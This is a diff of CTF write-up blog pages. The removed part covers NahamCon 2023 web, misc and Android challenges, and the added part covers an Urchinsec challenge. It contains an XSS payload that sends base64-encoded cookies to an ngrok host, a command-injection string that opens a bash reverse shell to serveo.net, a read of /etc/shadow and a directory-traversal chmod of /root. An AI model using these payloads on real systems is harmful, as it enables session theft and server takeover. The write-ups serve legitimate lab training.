-		alt="xss"
-	
-	
-></p>
-<p>this below is the payload i used . it fetches my ngrok endpoint with the cookie appanded at the end. I dont know if the first part was necessary , I   generated it by trial and error and it worked</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-<span class="s2">&#34;&gt;&lt;script&gt;
-</span><span class="s2">var iframe = document.body.appendChild(document.createElement(&#39;iframe&#39;));
-</span><span class="s2">iframe.style.cssText = &#39;height: 500px; width: 100%&#39;;
-</span><span class="s2">iframe.src = &#39;http://challenge.nahamcon.com:30467/signup&#39;;
-</span><span class="s2">iframe.onload = function() { fetch(&#39;http://f910-102-167-145-177.ngrok-free.app?iframeContents=&#39; + btoa(window.document.cookie), { method: &#39;GET&#39; }).then(response =&gt; response.json()).then(data =&gt; console.log(data)).catch(error =&gt; console.error(error)); };&lt;/script&gt;
-</span><span class="s2">
-</span></code></pre></td></tr></table>
-</div>
-</div><p>the flag will be returned in base64 format. Use it in the browser to access /admin page and the flag</p>
-<p><img src="/images/nahamcon2023/base64.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="base64"
-	
-	
-></p>
-<p><img src="/images/nahamcon2023/sflag.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="flag"
-	
-	
-></p>
-<hr>
-<h3 id="misc-category">misc category</h3>
-<hr>
-<h3 id="zombies">zombies</h3>
-<hr>
-<p>In this challenge you were provided with an ssh endpoint to connect to</p>
-<p>reading the file .user-entrypoint.sh</p>
-<p><img src="/images/nahamcon2023/nohup.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="file"
-	
-	
-></p>
-<p>nohup is  enables a program to run even after a terminal window is closed , if you check running processes you can see that tail is still running.
-Running processes usually have the activities stored in /proc directory. in the image below 11 is the pid of the tail process</p>
-<p><img src="/images/nahamcon2023/tail.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="flag"
-	
-	
-></p>
-<h3 id="mobile-category">mobile category</h3>
-<hr>
-<p>This challenge requires a set of  tools to be able to do anything :</p>
-<p><a class="link" href="https://github.com/pxb1988/dex2jar"  target="_blank" rel="noopener"
-    >dex2jar</a></p>
-<p><a class="link" href="http://java-decompiler.github.io/"  target="_blank" rel="noopener"
-    >jdgui</a></p>
-<p><a class="link" href="https://ghidra-sre.org/"  target="_blank" rel="noopener"
-    >ghidra</a></p>
-<p><a class="link" href="https://www.genymotion.com/"  target="_blank" rel="noopener"
-    >genymotion</a>  &laquo;  android emulator on pc</p>
-<p><a class="link" href="https://developer.android.com/tools/adb"  target="_blank" rel="noopener"
-    >adb</a></p>
-<p><a class="link" href="https://ibotpeaches.github.io/Apktool/"  target="_blank" rel="noopener"
-    >apktools</a></p>
-<h3 id="jninjaspeak">jninjaspeak</h3>
-<hr>
-<p>In this challnge you are provided with an apk file , you can install it on genymotion using adb, it is a simple prompt that  converts input to jninjaspeak.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">adb install jninjaspeak.apk
-
-</code></pre></td></tr></table>
-</div>
-</div><p>Decompile the application using apktool</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-use :   apktool -r -s d   jninjaspeak.apk
-
-
-</code></pre></td></tr></table>
-</div>
-</div><p>We use -r -s flags to tell apktool not to decompile the dexfiles to smali which it does by default.</p>
-<p>Convert the dex files to jar using dex2jar to be able to view the source using jdgui.</p>
-<p>In the mainactivity we see that the program needs libjninjaspeak.so  liblary that is used to translate the input.</p>
-<p>Here we use ghidra to reverse engineer the liblary , the liblary is in the /lib in the folder apktool generated.</p>
-<p>In ghidra , in the main function of the liblary we find the flag</p>
-<p><img src="/images/nahamcon2023/jninja.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="flag"
-	
-	
-></p>
-<p>flag{1f539e4a706e6181dae9db3fad6a78f1}</p>
-<hr>
-<h3 id="fortune-teller">Fortune teller</h3>
-<hr>
-<p>For this challenge follow the above steps  to install and decompile the application and convers dex files to jar.</p>
-<p>The mainactivity function in located the classes3.dex. Looking closely you can see that the application uses our input as a key to decrypt an encrypted file , the encryption used is AES.</p>
-<p>The file is decrypted in the decrypt.class. Where our input is used in the SecretKeySpec
-object.</p>
-<p>Based on my simple java programming undertanding :)  there is a variable called correctString that is initialized in the main function.</p>
-<p><img src="/images/nahamcon2023/correct.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="correct"
-	
-	
-></p>
-<p>It is followed by its getter function</p>
-<p><img src="/images/nahamcon2023/getter.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="getter"
-	
-	
-></p>
-<p>and then tracing it we find the  setter function</p>
-<p><img src="/images/nahamcon2023/setter.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="setter"
-	
-	
-></p>
-<p>It sets correctString to the value by resource id 2131755048 . Resource ids can be traced what that point to in the classes2.dex, path is shown below</p>
-<p><img src="/images/nahamcon2023/ridpath.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="ridpath"
-	
-	
-></p>
-<p><img src="/images/nahamcon2023/rid.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rid"
-	
-	
-></p>
-<p>It is point to a string , the resorces can be found the /res folder since the value is a string we goto /res/values  and cat strings.xml.</p>
-<p><img src="/images/nahamcon2023/strings.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="strings"
-	
-	
-></p>
-<p>The key is &ldquo;you won this ctf&rdquo; , enter it and get the flag</p>
-<p><img src="/images/nahamcon2023/teller_flag.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="flag"
-	
-	
-></p>
-<hr>
-<h3 id="wheres-waldo">wheres waldo</h3>
-<hr>
-<p>In this challenge you are provided with an apk file , follow the steps above to decompile it and open the sources in jd gui and install it in the emulator.</p>
-<p>This application is some type of maps applcation so the objective is to find the location of waldo in the map.</p>
-<p>Analysing the mainactivity function you can see thet the application is making a request to an endpoint which determines id we have found waldo and the distance from him</p>
-<p><img src="/images/nahamcon2023/waldo.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="waldo"
-	
-	
-></p>
-<p>The objective is to set longitude and latitude that results on the off_by value to result to zero as you can see below</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java">
-<span class="n">mapView1</span><span class="o">.</span><span class="na">getController</span><span class="o">().</span><span class="na">setCenter</span><span class="o">((</span><span class="n">IGeoPoint</span><span class="o">)</span><span class="k">new</span> <span class="n">GeoPoint</span><span class="o">(</span><span class="n">location</span><span class="o">.</span><span class="na">getLatitude</span><span class="o">(),</span> <span class="n">location</span><span class="o">.</span><span class="na">getLongitude</span><span class="o">()));</span>
-          <span class="n">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">()).</span><span class="na">url</span><span class="o">(</span><span class="s">&#34;http://challenge.nahamcon.com:30001/location?lat=&#34;</span> <span class="o">+</span> <span class="n">location</span><span class="o">.</span><span class="na">getLatitude</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;&amp;long=&#34;</span> <span class="o">+</span> <span class="n">location</span><span class="o">.</span><span class="na">getLongitude</span><span class="o">()).</span><span class="na">build</span><span class="o">();</span>
-          <span class="n">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">OkHttpClient</span><span class="o">()).</span><span class="na">newCall</span><span class="o">(</span><span class="n">request</span><span class="o">).</span><span class="na">execute</span><span class="o">();</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p>the code above takes the off_by and calculates the distance from waldo by miles.</p>
-<p>I scripted this  python program to do all the hardwork (at least).</p>
+<p>On the sesame applicatiion we login with the creds we found in the sqlite db file.</p>
+<p>If you read the src this application is used by bill to read files in the server.</p>
+<p>There is nothing else interesting so i looked through the source code.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -812,88 +879,173 @@ object.</p>
 </span><span class="lnt">24
 </span><span class="lnt">25
 </span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
-<span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">
+in main.py
 
-<span class="k">def</span> <span class="nf">calculate_distance</span><span class="p">(</span><span class="n">latitude</span><span class="p">,</span> <span class="n">longitude</span><span class="p">):</span>
-    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://challenge.nahamcon.com:30001/location?lat=</span><span class="si">{</span><span class="n">latitude</span><span class="si">}</span><span class="s1">&amp;long=</span><span class="si">{</span><span class="n">longitude</span><span class="si">}</span><span class="s1">&#39;</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>  <span class="c1"># Replace with the actual API endpoint</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-    <span class="n">off_by</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;off_by&#34;</span><span class="p">)</span>
-    <span class="n">i</span> <span class="o">=</span> <span class="n">off_by</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-    <span class="k">return</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+def dashboard():
+    if request.method == &#34;GET&#34;:
+        return render_template(&#39;dash.html&#39;)
+    if request.method == &#34;POST&#34;:
+        key = request.form.get(&#34;key&#34;)
+        file_read = request.form.get(&#34;fileread&#34;)
+        check_key = SesameKey.query.filter_by(key=key).first()
+        if check_key is not None:
+            num = 107
+            stk = chr(num)
+            secret = &#39;&#39;.join([chr(ord(x) ^ ord(stk)) for x in key])
+            with open(&#34;temp_secret&#34;, &#34;w&#34;) as temp:
+                temp.write(secret)
+            command = f&#34;sudo sesame -i temp_secret -r {file_read}&#34;
+            run = subprocess.check_output(command, shell=True)
+            run = run.decode(&#39;utf-8&#39;)
 
+            os.system(f&#34;rm -rf temp_secret&#34;)
 
-
-<span class="k">def</span> <span class="nf">move</span><span class="p">():</span>
-    <span class="n">pos</span><span class="o">=</span><span class="nb">list</span><span class="p">()</span>
-    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">180</span><span class="p">,</span><span class="mi">180</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">2</span><span class="p">):</span>
-            <span class="n">dis</span><span class="o">=</span><span class="n">calculate_distance</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
-            <span class="n">pos</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>
-
-    <span class="nb">print</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span>
-
-
-
-<span class="n">move</span><span class="p">()</span>
+            return render_template(&#39;dash.html&#39;, message=&#34;It Works&#34;)
+        else:
+            return render_template(&#39;dash.html&#39;, message=&#34;Wrong Key&#34;)
 
 </code></pre></td></tr></table>
 </div>
-</div><p>The code above  i used to be able to narrow down on which coordinated produces the least distance from waldo</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-<span class="nv">lat</span><span class="o">=</span>30<span class="p">&amp;</span><span class="nv">long</span><span class="o">=</span>-60 low 1099.613580066382
-
-this was the lowest
-
-</code></pre></td></tr></table>
-</div>
-</div><p>from here i entered the values manually by trying  raising the value higher or lower and chacking the changes in the distance</p>
-<p>at   lat=40.60 and long -74.67 we needed to go even smaller units so i researched and found out that api use the following format to show distance</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Latitude: ±DD.DDDDDD
-Longitude: ±DDD.DDDDDD
-
-where D is any number between 1-9
-
-</code></pre></td></tr></table>
-</div>
-</div><p>final position lat=40.583333 and long=-74.67</p>
-<p><img src="/images/nahamcon2023/waldo_flag.png"
+</div><p>If you look carefully our user input is not being sanitized and it is being put directly to subprocess module. Seeing this you immediately think command execution.</p>
+<p>The catch is that the output of a command you run will not be displayed.</p>
+<p>So after some trial i created:</p>
+<p><img src="/images/urchinsec/cmd.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="waldo_flag"
+		alt="cmd"
 	
 	
 ></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">key=IpwnEazy@@#TH!ngG5~&amp;fileread=/etc/passwd; bash -c &#34;bash -i &gt;&amp; /dev/tcp/serveo.net/33997 0&gt;&amp;1&#34;&amp;action=
+
+</code></pre></td></tr></table>
+</div>
+</div><p>This gets  us  a reverse shell. We are now the user bill. From here i created ssh keys so that i could login via ssh which is better and more stable.</p>
+<p><img src="/images/urchinsec/ssh.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="ssh"
+	
+	
+></p>
+<hr>
+<p>Our target now us to achieve root.</p>
+<p>Running sudo -l we can see that our user can run &ldquo;sesame&rdquo; command with sudo rights.</p>
+<p>This command is used earlier in the python application</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Running : sudo sesame -i temp_secret -r /etc/shadow 
+
+Note: shadow file is only read by root so with this  command we can read files as the root user.
+
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/urchinsec/shadoww.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="shadow"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">
+Error: -i is a required argument
+Usage of sesame:
+  -h	Prints This Output
+  -i string
+    	Input Secret File To Read Secret (-i /path/to/secret.txt)
+  -r string
+    	File To Read (-r /path/to/filetoread.txt)
+  -s	Change Permissions Of Files
+
+</code></pre></td></tr></table>
+</div>
+</div><p>It also supports changing of file permissions with -s flag.</p>
+<p>SO in order to read the root flag we can exploit this. So after some trial and error i did this:</p>
+<p>The binary only allowed to set permissions in the sesame/test directory, but it was also vulnerable to directory transversal.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">sudo sesame -i temp_secret -s 
+
+
+When it prompts for a file enter 
+
+
+../../../../../../root/.
+
+
+When it prompts for permission 
+
+777
+
+</code></pre></td></tr></table>
+</div>
+</div><p>This above will make the root permission be rwx by everyone.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">. (dot): This refers to the current directory. For example, if you&#39;re in the directory /home/user, then . refers to /home/user.
+
+</code></pre></td></tr></table>
+</div>
+</div><p>From here you can read the root flag</p>
+<p>flag : urchinsec{I_know_CTF_This_S3rV35_IS_we334akK_NEXTTTT}</p>
+<hr>
 
 </section>
 
@@ -927,25 +1079,6 @@ where D is any number between 1-9
     <h2 class="section-title">Related content</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/urchinsec-ctf-2024/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/urchinsec.png" loading="lazy" data-key="" data-hash="/cover/urchinsec.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Urchinsec ctf 2024</h2>
-        </div>
-    </a>
-</article>
-
             
                 
 <article class="has-image">
@@ -1018,6 +1151,25 @@ where D is any number between 1-9
 
         <div class="article-details">
             <h2 class="article-title">Hack_the_boo2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/blackhat_mea_2023/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/bh.png" loading="lazy" data-key="" data-hash="/cover/bh.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Blackhat_mea_2023</h2>
         </div>
     </a>
 </article>
